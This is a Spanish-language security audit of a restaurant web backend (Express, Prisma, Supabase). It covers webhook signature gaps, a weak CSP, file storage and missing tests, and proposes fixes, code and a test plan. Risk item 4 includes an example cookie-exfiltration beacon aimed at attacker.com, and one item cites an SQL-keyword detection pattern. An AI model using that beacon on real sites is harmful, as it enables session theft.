# AUDITORÍA BACKEND — MANDY'S BAR

> Habilidades aplicadas: `backend-skill`, `optimizacion-estricta-concisa`, `security-best-practices`, `webapp-testing`.
> Stack revisado: **Node.js + Express + Prisma + PostgreSQL (Supabase)**, JWT, Helmet, NodeCache, Zod, multer, rotating-file-stream, express-rate-limit.
> Fecha: 2026-04-30. Modo zero-fluff. Lo que ya está bien no se repite.

---

## 1. DIAGNÓSTICO TÉCNICO BREVE

Backend modular maduro. Estructura por dominio (`backend/src/modules/<x>/<x>.{controller,routes}.ts`) + utilidades transversales (`middlewares`, `lib`, `utils`). Capas de seguridad ya activas: HTTPS-Enforce → Helmet+CSP → headers extra → CORS → JSON limit → request sanitizer → rotating logs → routes → globalErrorHandler. JWT con códigos `NO_TOKEN | TOKEN_EXPIRED | TOKEN_INVALID`. Rate limiting identity-based en `/auth` (10/15min) y `/orders` (200/h). Caché de productos con invalidación dirigida (no más `flushAll`). Orders con transacción `Serializable` + retry. Soft-delete en orders preservando `consecutivo_anual`.

**Estado general:** sólido en arquitectura y RBAC. Débil en webhooks, almacenamiento de archivos, auditoría admin de productos y validación de transiciones de estado.

---

## 2. PROBLEMAS ENCONTRADOS

### 2.1 P0 — CRÍTICOS

| # | Archivo | Síntoma | Causa raíz |
|---|---------|---------|------------|
| C1 | `backend/src/controllers/webhookController.ts:7-30` | El endpoint `/api/webhooks` acepta cualquier body con `event_id + provider`. **No verifica firma HMAC.** | `WEBHOOK_SECRET` del `.env` nunca se compara con header de firma del proveedor. |
| C2 | `backend/src/routes/uploadRoutes.ts:21-31, 86-93` | Imágenes guardadas en `backend/uploads/` (disco local). URLs `/uploads/...` no persisten en redeploy/contenedores. | `multer.diskStorage` + `app.use('/uploads', express.static(...))`. Supabase Storage no integrado pese a tener `SUPABASE_URL` y cliente disponible. |
| C3 | `backend/src/index.ts:79-98` | CSP con `scriptSrc: ['self','unsafe-inline','cdn.jsdelivr.net']` y `imgSrc: ['self','data:','blob:','http://localhost:3000','https:']`. | `'unsafe-inline'` neutraliza protección XSS del CSP; `https:` global permite exfiltración a cualquier dominio. |
| C4 | `backend/src/index.ts:140-145` | `app.use('/uploads', express.static(UPLOADS_DIR))` y `app.use('/images', express.static(...))` sirven directorios locales arbitrarios y mezclan `apps/client/public/images` con backend. | Acoplamiento entre apps + superficie estática innecesaria. Tras migrar a Supabase Storage, deja zombi expuesto. |
| C5 | `backend/src/modules/orders/orders.controller.ts:172-189` | Fallback `findFirst({ nombre: equals, mode: insensitive })` en `createOrder`. | Resuelve productos por nombre case-insensitive — colisión entre dos productos con nombre similar puede facturar el equivocado. |

### 2.2 P1 — IMPORTANTES

| # | Archivo | Problema |
|---|---------|----------|
| H1 | `backend/src/index.ts:110-113` | `allowedOrigins` mezcla env y hardcodes `http://localhost:5174`. En producción no se filtra. |
| H2 | `backend/src/index.ts:75-98` | `helmet()` se llama y luego se sobrescribe parcialmente con `helmet.contentSecurityPolicy(...)`. Confuso, redundante. |
| H3 | `backend/src/modules/products/products.controller.ts` (todo) | Las mutaciones admin (`createProduct`, `updateProduct`, `deleteProduct`, toggle `activo`) **no escriben en `AuditLog`**. La guía §9 lo exige para acciones admin. |
| H4 | `backend/src/modules/orders/orders.controller.ts` `updateOrderStatus`/`approveOrder` | No se valida explícitamente la transición de estado (ej. no se puede pasar de `ANULADA` → `COMPLETADA`). Riesgo de inconsistencia. |
| H5 | `backend/src/controllers/webhookController.ts:34-37` | `payload: payload \|\| {}` — sin Zod ni allowlist de campos. |
| H6 | `backend/src/index.ts:184-198` | `primeWarmCaches()` bloquea `app.listen`. Si Supabase tarda, el server queda no-disponible. |
| H7 | `backend/src/index.ts:104-108` y `webhookController.ts` | Uso de `(req as any).id`. Tipar `Request.id` con declaration merging. |
| H8 | `backend/.env` | Falta `SUPABASE_SERVICE_ROLE_KEY` (necesaria para subir a Storage desde backend). `.env.example` debe listarla. |
| H9 | `backend/src/modules/orders/orders.controller.ts:236-242` | `details: JSON.stringify({ device: req.headers['user-agent'] })` sin truncar. UA arbitrariamente largo → bloat de log + riesgo de log injection. |
| H10 | Backend completo | **No hay tests automatizados.** No se encontraron `*.spec.ts` ni `*.test.ts` en `backend/`. |

### 2.3 P2 — MEJORAS

- M1 — `JWT_EXPIRES_IN` default `'24h'`. En admin activo + dispositivo robado da ventana grande. Considerar `8h` y refresh token rotativo (decisión pendiente del usuario).
- M2 — `getMyOrders` y similares no documentan los índices que aprovechan. Confirmar `@@index([user_id])`, `@@index([fecha])` cubren los patrones reales (parece sí).
- M3 — `morgan` escribe a archivo rotado pero no envía a observabilidad externa (Logtail / Sentry / Datadog). Para producción real, conectar.
- M4 — `globalErrorHandler` debe garantizar nunca filtrar `stack` en producción. Verificar.
- M5 — `app.use(express.json({ limit: '256kb' }))` razonable; pero `/api/upload` recibe multipart, no JSON, así que el límite no aplica. Confirmar que multer (5MB) sea el único guardian del tamaño de imagen.
- M6 — `INJECTION_PATTERNS` incluye `(\b(SELECT|INSERT|UPDATE|...)\b\s)` — bloquea texto legítimo (ej. nota de cliente "necesito UPDATE en mi pedido"). Excluido `observacion_pago` y `motivo_anulacion` ✅, pero falta `notas` de orders, `descripcion` de productos. Validar no falsos positivos.
- M7 — Multer `fileFilter` valida ext + MIME; `imageValidator.ts` valida magic bytes ✅. Bien.
- M8 — `SiteEvent.@@unique([kind, slug])` ✅. Verificar que admin de site-content respete la constraint y la maneje sin 500.

---

## 3. RIESGOS DETECTADOS

1. **Suplantación de webhooks (C1)** — atacante puede crear registros `webhook_events` arbitrarios, llenar la tabla y eventualmente correlacionar con flujos de pago si éstos consumen `webhook_events`.
2. **Pérdida de imágenes (C2)** — cada redeploy o reinicio de contenedor borra `backend/uploads/`. Productos quedan con `imagen_url` rota.
3. **XSS persistente vía CSP débil (C3)** — si un campo admin (descripción de producto, nota de evento) inyecta `<script>`, el CSP no lo bloquea por `'unsafe-inline'`.
4. **Exfiltración silenciosa (C3)** — `imgSrc: 'https:'` permite a un atacante con XSS hacer beacons a cualquier dominio https vía `<img src="https://attacker.com/?cookie=..." />`.
5. **Errores de facturación (C5)** — fallback por nombre puede atribuir compra al producto equivocado, generando inconsistencia entre `OrderItem.product_id` y lo que el cliente realmente pidió.
6. **Auditoría incompleta (H3)** — si un admin malicioso modifica precios o desactiva productos clave, no hay rastro en `AuditLog` para forenses.
7. **Estado de orden inválido (H4)** — race entre dos admins puede dejar una orden en estado incoherente.
8. **Indisponibilidad por warm-cache (H6)** — si Supabase está lento al boot, el load balancer marca el contenedor como no-saludable y lo recicla en loop.
9. **Log injection / bloat (H9)** — UA controlado por atacante puede inflar logs y costos de almacenamiento.
10. **Cero red de seguridad (H10)** — sin tests, cualquier refactor tiene altísima probabilidad de romper algo silenciosamente.

---

## 4. CAMBIOS RECOMENDADOS

### Prioridad CRÍTICO (bloquea producción real)

1. **Verificación HMAC en webhook (C1).** Header `X-Webhook-Signature: sha256=<hex>`. Backend computa `crypto.createHmac('sha256', WEBHOOK_SECRET).update(rawBody).digest('hex')` y compara con `crypto.timingSafeEqual`. Rechazar 401 si falla. **Importante:** debes capturar el `rawBody` ANTES de `express.json()` con un parser dedicado en `/api/webhooks`.
2. **Migrar uploads a Supabase Storage (C2).**
   - `backend/src/lib/supabaseStorage.ts` con singleton `createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY)`. Service role solo en backend.
   - `multer.memoryStorage()`. Buffer → magic bytes → WebP → upload a bucket (`product-images`, `gallery`, `events`, `users-avatars`).
   - URL pública vía `getPublicUrl`. Persistir esta URL en `Product.imagen_url`.
   - Eliminar `app.use('/uploads', express.static(UPLOADS_DIR))` del index.
   - Script `backend/scripts/migrate-local-images-to-supabase.ts` con `--dry-run`.
   - Buckets configurados en `backend/scripts/setup-storage.ts` (idempotente) + RLS SQL en `backend/scripts/storage-policies.sql`.
3. **Endurecer CSP (C3).**
   - Quitar `'unsafe-inline'` de `scriptSrc`. Si Vite genera scripts inline, usar `'nonce-<random>'` por request.
   - Reemplazar `imgSrc: ['https:']` por allowlist explícita: `["'self'", 'data:', 'blob:', '<supabase-project>.supabase.co']`.
   - Eliminar `http://localhost:3000` de `imgSrc` y `connectSrc` en producción (env-aware).
4. **Eliminar static serving local (C4).** Tras la migración, borrar las rutas `/uploads` y `/images` de `index.ts`. Imágenes deben venir de Supabase Storage o del bundle de Vite.
5. **Reemplazar fallback por nombre (C5).** Frontend debe enviar siempre `productId` UUID válido. Si no llega UUID válido → 400. Eliminar la rama `findFirst({ nombre: equals })`. Migrar el menú estático a productos reales en DB primero (script de seed).

### Prioridad IMPORTANTE

6. **CORS env-driven (H1).** `process.env.FRONTEND_URL_ADMIN`, `FRONTEND_URL_CLIENT`. En producción no debe haber `localhost`.
7. **Limpiar Helmet (H2).** Una sola llamada `helmet({ contentSecurityPolicy: { directives: {...} } })`.
8. **Auditoría admin de productos (H3).** Helper `logAdminAction(userId, accion, entidad, entidad_id, datos_anteriores, datos_nuevos)` que escriba en `AuditLog`. Llamar en `createProduct`, `updateProduct`, `updateProductActive`, `deleteProduct`. Aplicar también a site-content y users.
9. **Máquina de estados de orden (H4).** Tabla/objeto `ORDER_STATE_TRANSITIONS` que defina qué estados aceptan ir a qué. `updateOrderStatus` valida `from → to` antes del `update`. 409 si inválido.
10. **Validar payload de webhook (H5).** Zod schema por `provider`. Reject si no matchea.
11. **Warm cache asíncrona (H6).** Mover `primeWarmCaches()` a `setImmediate(() => primeWarmCaches().catch(...))` después de `app.listen`. Health = ready en cuanto el puerto escucha.
12. **Tipar `Request.id` (H7).** En `backend/src/types/express.d.ts`:
    ```ts
    declare global { namespace Express { interface Request { id: string } } }
    ```
13. **`SUPABASE_SERVICE_ROLE_KEY` (H8).** Añadir a `.env.example` (vacío) y a `.env` real (no commitear).
14. **Truncar UA y campos libres en logs (H9).** Helper `truncate(str, max=200)` antes de incluir en `details`.
15. **Suite de tests backend mínima (H10).** Vitest + Supertest. Cobertura mínima:
    - `auth/login` — happy path, password incorrecto, rate limit.
    - `products` — CRUD admin + lectura pública + toggle activo.
    - `orders` — crear, aprobar, cancelar, BOLA (user A no ve orders de user B).
    - `upload` — imagen válida, archivo no-imagen, > 5MB.
    - `webhooks` — firma HMAC válida vs inválida, idempotencia.
    - `site-content` — guardar draft + publicar.

### Prioridad MEJORA

16. M1: refresh tokens rotativos + `JWT_EXPIRES_IN=15m` para access + 7d para refresh. (Decisión pendiente: define con el usuario.)
17. M3: integrar Sentry o equivalente con `dsn` por env.
18. M4: confirmar que `globalErrorHandler` solo loguea `err.stack` y al cliente devuelve `{ error: '...', code: '...' }`.
19. M6: validar lista `INJECTION_PATTERNS` contra payloads reales (`notas`, `descripcion`, `motivo`). Añadir más campos a `SANITIZE_EXCLUDE_FIELDS` si rompen UX.

---

## 5. ARCHIVOS AFECTADOS

### Crear

- `backend/src/lib/supabaseStorage.ts`
- `backend/src/lib/auditLog.ts`
- `backend/src/lib/orderStateMachine.ts`
- `backend/src/lib/truncate.ts`
- `backend/src/types/express.d.ts`
- `backend/src/modules/webhooks/webhooks.routes.ts` (con raw body parser)
- `backend/scripts/setup-storage.ts`
- `backend/scripts/storage-policies.sql`
- `backend/scripts/migrate-local-images-to-supabase.ts`
- `backend/tests/auth.spec.ts`
- `backend/tests/products.spec.ts`
- `backend/tests/orders.spec.ts`
- `backend/tests/upload.spec.ts`
- `backend/tests/webhooks.spec.ts`
- `backend/tests/site-content.spec.ts`

### Modificar

- `backend/src/index.ts` — limpiar Helmet, CSP env-aware, CORS env-driven, quitar static `/uploads` y `/images`, warm-cache async.
- `backend/src/routes/uploadRoutes.ts` — memoryStorage + Supabase Storage.
- `backend/src/controllers/webhookController.ts` — verificación HMAC + Zod del payload + raw body.
- `backend/src/modules/products/products.controller.ts` — invocar `logAdminAction` en mutaciones.
- `backend/src/modules/orders/orders.controller.ts` — eliminar fallback por nombre, aplicar máquina de estados, truncar UA.
- `backend/src/modules/site-content/site-content.controller.ts` — `logAdminAction`.
- `backend/src/middlewares/security.ts` — afinar `INJECTION_PATTERNS` si aplica.
- `backend/.env.example` — añadir `SUPABASE_SERVICE_ROLE_KEY`, `FRONTEND_URL_ADMIN`, `FRONTEND_URL_CLIENT`, `WEBHOOK_SECRET` (ya está).
- `backend/package.json` — añadir scripts `test`, `test:watch` y dependencias `vitest`, `supertest`.

### Eliminar (tras migración)

- Rutas `/uploads` y `/images` en `backend/src/index.ts`.
- `backend/uploads/` (contenido viejo, después de migración exitosa con `--dry-run` confirmado).

---

## 6. CÓDIGO PROPUESTO (extractos clave)

### 6.1 Verificación HMAC del webhook

```ts
// backend/src/middlewares/verifyWebhookSignature.ts
import crypto from 'crypto';
import { Request, Response, NextFunction } from 'express';

const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET;
if (!WEBHOOK_SECRET) throw new Error('WEBHOOK_SECRET no configurado');

export const verifyWebhookSignature = (req: Request, res: Response, next: NextFunction) => {
  const received = req.header('x-webhook-signature');
  const raw = (req as any).rawBody as Buffer | undefined;
  if (!received || !raw) return res.status(401).json({ error: 'firma ausente' });

  const expected = crypto.createHmac('sha256', WEBHOOK_SECRET).update(raw).digest('hex');
  const a = Buffer.from(received.replace(/^sha256=/, ''), 'hex');
  const b = Buffer.from(expected, 'hex');
  if (a.length !== b.length || !crypto.timingSafeEqual(a, b)) {
    return res.status(401).json({ error: 'firma inválida' });
  }
  next();
};
```

```ts
// backend/src/index.ts (extracto)
app.use('/api/webhooks', express.raw({ type: 'application/json', limit: '256kb' }),
  (req, _res, next) => { (req as any).rawBody = req.body; req.body = JSON.parse(req.body.toString('utf8')); next(); },
  verifyWebhookSignature, webhookRoutes);
```

### 6.2 Helper de auditoría admin

```ts
// backend/src/lib/auditLog.ts
import prisma from './prisma.js';

export const logAdminAction = async (params: {
  userId: string;
  accion: string;            // ej. 'PRODUCT_UPDATE'
  entidad: string;           // ej. 'product'
  entidad_id: string;
  datos_anteriores?: unknown;
  datos_nuevos?: unknown;
}) => {
  await prisma.auditLog.create({
    data: {
      usuario_que_modifica: params.userId,
      accion: params.accion,
      entidad: params.entidad,
      entidad_id: params.entidad_id,
      datos_anteriores: params.datos_anteriores ? JSON.stringify(params.datos_anteriores) : null,
      datos_nuevos: params.datos_nuevos ? JSON.stringify(params.datos_nuevos) : null,
    },
  });
};
```

### 6.3 Máquina de estados de orden

```ts
// backend/src/lib/orderStateMachine.ts
const TRANSITIONS: Record<string, string[]> = {
  PENDIENTE_VERIFICACION: ['VERIFICADA', 'ANULADA'],
  VERIFICADA:             ['EN_PREPARACION', 'ANULADA'],
  EN_PREPARACION:         ['LISTA', 'ANULADA'],
  LISTA:                  ['COMPLETADA', 'ANULADA'],
  COMPLETADA:             [],
  ANULADA:                [],
};
export const canTransition = (from: string, to: string) =>
  TRANSITIONS[from]?.includes(to) ?? false;
```

### 6.4 CSP endurecida (env-aware)

```ts
// backend/src/index.ts (extracto)
const isProd = process.env.NODE_ENV === 'production';
const SUPABASE_HOST = SUPABASE_URL ? new URL(SUPABASE_URL).host : '';

app.use(helmet({
  contentSecurityPolicy: {
    useDefaults: true,
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: isProd ? ["'self'"] : ["'self'", "'unsafe-inline'"],
      styleSrc: ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],
      fontSrc: ["'self'", 'https://fonts.gstatic.com'],
      imgSrc: ["'self'", 'data:', 'blob:', ...(SUPABASE_HOST ? [`https://${SUPABASE_HOST}`] : [])],
      connectSrc: [
        "'self'",
        ...(SUPABASE_URL ? [SUPABASE_URL] : []),
        ...(SUPABASE_WS_URL ? [SUPABASE_WS_URL] : []),
        ...(isProd ? [] : ['http://localhost:3000', 'http://localhost:5173', 'http://localhost:5174']),
      ],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: isProd ? [] : null,
    },
  },
}));
```

### 6.5 Warm-cache async

```ts
// backend/src/index.ts (extracto)
app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
});
setImmediate(() => {
  primeWarmCaches().catch((err) => console.error('[warm-cache] fallo:', err));
});
```

---

## 7. IMPACTO ESPERADO

| Área | Mejora | Riesgo / Aviso al frontend |
|------|--------|----------------------------|
| Seguridad | Webhook firmado, CSP estricta, sin static serving local, fallback de nombre eliminado. | Frontend admin DEBE enviar `productId` UUID en `createOrder`. Cualquier consumo del menú estático del cliente debe migrarse a productos reales. |
| Persistencia | Imágenes en Supabase Storage, sobreviven a redeploy. | URL en `Product.imagen_url` cambia de `/uploads/...` a `https://<proj>.supabase.co/storage/...`. Cliente debe aceptar ambos durante migración. |
| Auditoría | `AuditLog` cubre productos, site-content y users. | Sin impacto frontend. |
| Performance | Warm-cache no bloquea boot. Server `READY` antes. | Posible primer request más lento mientras la caché se calienta. |
| Estabilidad | Estados de orden válidos, bloqueo de transiciones inválidas. | Frontend admin debe esperar 409 con `code: 'INVALID_TRANSITION'` y mostrar mensaje claro. |
| Calidad | Tests automatizados Vitest + Supertest. | CI debe correrlos en cada PR. |

**Breaking changes (avisar a frontend):**

1. `POST /api/orders` → exige UUIDs reales de productos.
2. URLs de imágenes pasan a dominio Supabase. Whitelist en cliente si valida URLs.
3. CSP no permite scripts inline en producción — Vite ya genera bundles, pero confirmar.

---

## 8. VALIDACIÓN FINAL

Antes de declarar terminado, ejecuta TODO esto:

### 8.1 Build & Typecheck
```bash
cd backend && npm run build && npx tsc --noEmit
cd apps/admin && npm run build
cd apps/client && npm run build
```

### 8.2 Tests
```bash
cd backend && npm test
```
Esperado: 100% verde, mínimo 6 archivos de test, > 50 casos cubiertos.

### 8.3 Smoke endpoints (curl o Postman)

```
# 1. Health
GET /api/healthz   → 200 { status: 'OK' }
GET /api/readyz    → 200 { status: 'READY' }

# 2. Auth
POST /api/auth/login {correo, password}                  → 200 + token
POST /api/auth/login {wrong}                             → 401 'Correo o contrasena invalidos'
× 11 intentos seguidos                                   → 429 rate limit

# 3. Products admin
GET /api/products/admin (sin token)                      → 401 NO_TOKEN
GET /api/products/admin (token USER)                     → 403
GET /api/products/admin (token ADMIN)                    → 200
POST /api/products (ADMIN) → AuditLog row created
PATCH /api/products/:id/active → < 250ms, AuditLog row

# 4. Upload
POST /api/upload (image 4MB válida)                      → 200 url=https://*.supabase.co/storage/...
POST /api/upload (txt renombrado .png)                   → 400 magic bytes
POST /api/upload (image 6MB)                             → 400 LIMIT_FILE_SIZE

# 5. Webhook
POST /api/webhooks (sin firma)                           → 401
POST /api/webhooks (firma inválida)                      → 401
POST /api/webhooks (firma válida + payload conocido)     → 200
POST /api/webhooks (mismo event_id)                      → 200 'ya procesado'

# 6. Orders BOLA
GET /api/orders/me (user A)                              → solo orders de A
PUT /api/orders/status/:id (estado inválido)             → 409 INVALID_TRANSITION
DELETE /api/orders/:id (USER)                            → 403
DELETE /api/orders/:id (ADMIN)                           → 200 + soft delete + AuditLog
```

### 8.4 Webapp testing (Playwright, `webapp-testing`)

Suite obligatoria en `tests/admin-products.spec.ts` y `tests/orders-flow.spec.ts`:

- Login admin → dashboard.
- Crear producto con imagen → URL Supabase visible.
- Toggle activo → response < 500ms, persiste tras reload.
- Eliminar producto con orders asociadas → marca inactivo (no error 500).
- Crear orden cliente → admin la ve → aprobar → completar → no permite revertir a PENDIENTE.
- Subir HEIC desde admin → conversión OK → URL Supabase.
- Logout multi-pestaña → otras pestañas se desloguean.

### 8.5 Métricas a medir (`PERF_REPORT.md`)

| Endpoint | Antes | Objetivo | Después |
|----------|-------|----------|---------|
| `GET /api/products?...` (admin) | medir | < 150ms p95 | medir |
| `PATCH /api/products/:id/active` | medir | < 250ms p95 | medir |
| `GET /api/orders/all` | medir | < 300ms p95 | medir |
| Boot del server | medir | < 2s a `READY` | medir |

---

## 9. CHECKLIST FINAL (de `buenas-practicas-desarrollo.md` §24)

- [ ] El cambio compila (`backend`, `apps/admin`, `apps/client` cuando aplique).
- [ ] `tsc --noEmit` limpio en los tres workspaces tocados.
- [ ] No rompiste rutas, imports, contratos `@mandys/shared`.
- [ ] Cero `console.log` debug. Cero `as any` nuevos.
- [ ] Patrón del repo respetado (módulos por dominio).
- [ ] Mensaje de error: detalle a logs, mensaje seguro al usuario.
- [ ] Verificado con curl/test concreto, no de memoria.
- [ ] Smoke de áreas tocadas ejecutado (auth, productos, orders, uploads, webhook).
- [ ] `AuditLog` recibe entrada por cada mutación admin.
- [ ] `.env` y `.env.example` alineados, sin secretos en repo.
- [ ] PR atómico — un commit por intención (feat/fix/refactor).

---

## 10. PENDIENTES DE DECISIÓN DEL USUARIO

Bloquean implementación, no análisis:

1. **Refresh token vs sesión larga.** Recomiendo refresh rotativo + access 15m. Decide.
2. **Migración del menú estático del cliente.** Hoy `apps/client/src/data/menuData.ts` tiene productos hardcodeados. Para eliminar el fallback por nombre (C5), hay que migrar a DB. ¿Lo hacemos en esta tanda o se queda para otra?
3. **Deploy persistente vs serverless.** Define `?pgbouncer=true&connection_limit=...` en `DATABASE_URL`.
4. **Cobertura de tests mínima.** ¿Aceptas 50 casos como suficiente para v1, con plan de subir a 100+?
5. **Sentry / Logtail / Datadog.** ¿Hay alguno preferido para shipping de logs?

---

**Fin del informe.** Lista `AUDIT_REPORT.md` para entrega. Ningún cambio aplicado al código todavía.
